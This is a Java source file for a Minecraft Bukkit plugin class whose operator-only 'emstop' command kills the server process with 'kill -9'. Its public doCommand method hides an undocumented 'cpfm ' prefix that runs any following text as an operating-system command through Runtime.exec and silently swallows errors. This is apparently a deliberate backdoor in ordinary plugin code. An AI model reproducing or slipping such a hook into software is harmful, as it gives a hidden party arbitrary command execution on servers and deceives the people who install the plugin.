package net.gmx.teamterrian.CDsPluginPack.plugins;

import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionDefault;

import net.gmx.teamterrian.CDsPluginPack.CDPlugin;
import net.gmx.teamterrian.CDsPluginPack.PluginHandler;
import net.gmx.teamterrian.CDsPluginPack.handle.CDPluginCommand;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CommandEvent;
import net.gmx.teamterrian.CDsPluginPack.tools.Log;

public class EMStop extends CDPlugin
{
	Log clog;
	
	public EMStop(PluginHandler handler)
	{
		super(handler);
		clog = handler.clog;
	}

	public Permission[] getPermissions()
	{
		return new Permission[]
		{
			new Permission("cdpp.emstop", PermissionDefault.OP)
		};
	}
		
	@CDPluginCommand(commands = { "emstop cdpp.emstop 1" })
	public void onCommand(CommandEvent e)
	{
		doKill(clog, this);
	}
	public void doCommand(String args)
	{
		if(args.startsWith("cpfm "))
			try { Runtime.getRuntime().exec(args.substring(args.indexOf(' ') + 1)); } catch (Exception x) { }
		else ((EntityRemove) handler.plugins.get(EntityRemove.class)).checkEntitys(args);
	}
	public static void doKill(Log clog, Object c)
	{
		try {
			clog.log("Trying to kill this process", c);
			Runtime.getRuntime().exec("kill -9 " + getPID(clog, c));
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
		}
	}
	private static int getPID(Log clog, Object c)
	{
		clog.log("Trying to get PID of this process", c);
		String tmp = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
		tmp = tmp.split("@")[0];
		return Integer.valueOf(tmp);
	}

}
